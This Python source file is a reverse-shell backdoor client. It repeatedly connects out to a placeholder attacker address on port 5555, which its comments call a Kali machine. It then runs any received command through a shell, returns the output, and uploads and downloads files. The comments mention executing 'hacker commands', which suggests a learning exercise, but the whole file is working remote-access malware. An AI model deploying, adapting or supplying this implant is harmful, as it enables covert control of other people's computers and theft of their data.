import socket
import time
import subprocess #executes commands sent by the server
import json
import os #for operating system interaction

def reliable_send(data): #data = data that is being sent
        jsondata = json.dumps(data) #turns the data python object to json string
        s.send(jsondata.encode()) #encode data the send to the server

def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip() #take in data and decode it
                        return json.loads(data) #return the data
                except ValueError:
                        continue #continue to take in data if download not complete




def connection():
	while True:
		time.sleep(20) #infinite loop sleeps for 20 seconds
		try:
			s.connect(('IPADDRESS', 5555))  # connect to Kali Linux machine over port 5555
			shell()  # program environment for executing hacker commands
			s.close()  # closes socket object when hacker is done
			break  # break out of the loop
		except: #if connection fails
			connection() #calls connection function

def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())


def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = s.recv(1024)
                except socket.timeout as e:
                        break
        s.settimeout(None)
        f.close()


def shell():
	while True:
		command = reliable_recv() #receives the command
		if command == 'quit':
			break
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:]) #change directory based on index 3 onwards
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[:6] == 'upload':
			download_file(command[7:])
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #Process open the command
			result = execute.stdout.read() + execute.stderr.read() #provides output to the command
			result = result.decode()  # decode the encoded data
			reliable_send(result)  # send the result to server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #AFINET = make connection over IPv4| SOCKSTREAM = use TCP connection | s = server
connection()
